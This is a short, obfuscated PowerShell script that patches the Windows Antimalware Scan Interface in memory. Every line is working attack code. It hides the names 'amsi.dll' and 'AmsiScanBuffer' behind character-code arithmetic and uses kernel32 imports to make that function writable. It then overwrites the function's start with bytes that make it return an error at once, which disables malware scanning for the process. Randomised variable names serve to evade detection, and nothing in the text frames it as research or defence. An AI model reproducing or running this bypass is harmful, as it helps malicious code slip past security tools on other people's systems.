$_jka = @"
using System;
using System.Runtime.InteropServices;
public class _jka {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr Pcnc25OhTxO_zt, string qjrXBZRSPJbKN);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr GlpyXnx, UIntPtr LDq8_O0gbM_2c2USW4Z, uint Sl1KIOupMWBO, out uint KBBgJ);
}
"@

Add-Type $_jka

$i0G = [_jka]::LoadLibrary("$([cHAR](97*62/62)+[cHAR]([bYTe]0x6d)+[cHar]([Byte]0x73)+[CHAr](105)+[Char](46)+[cHar](100*14/14)+[chAr](108+10-10)+[cHAR](1+107))")
$KwArHV2qzqIf = [_jka]::GetProcAddress($i0G, "$([ChAr](65)+[CHaR](109)+[ChaR]([BytE]0x73)+[CHAr]([BYTe]0x69)+[Char](68+15)+[cHAr](99)+[cHAr](97+1-1)+[char]([ByTE]0x6e)+[cHaR]([bYte]0x42)+[ChaR](117)+[chaR](102*79/79)+[ChAR]([byte]0x66)+[cHaR](101+18-18)+[cHAR](99+15))")
$p = 0
[_jka]::VirtualProtect($KwArHV2qzqIf, [uint32]5, 0x40, [ref]$p)
$gFWo7RH = "0xB8"
$svPLohI2vF1ZieeL = "0x57"
$ert = "0x00"
$SmnQ1U9NWNZOo5y = "0x07"
$VtN = "0x80"
$Qdn9qyP6 = "0xC3"
$YbghhiXzwN1Sn = [Byte[]] ($gFWo7RH,$svPLohI2vF1ZieeL,$ert,$SmnQ1U9NWNZOo5y,+$VtN,+$Qdn9qyP6)
[System.Runtime.InteropServices.Marshal]::Copy($YbghhiXzwN1Sn, 0, $KwArHV2qzqIf, 6)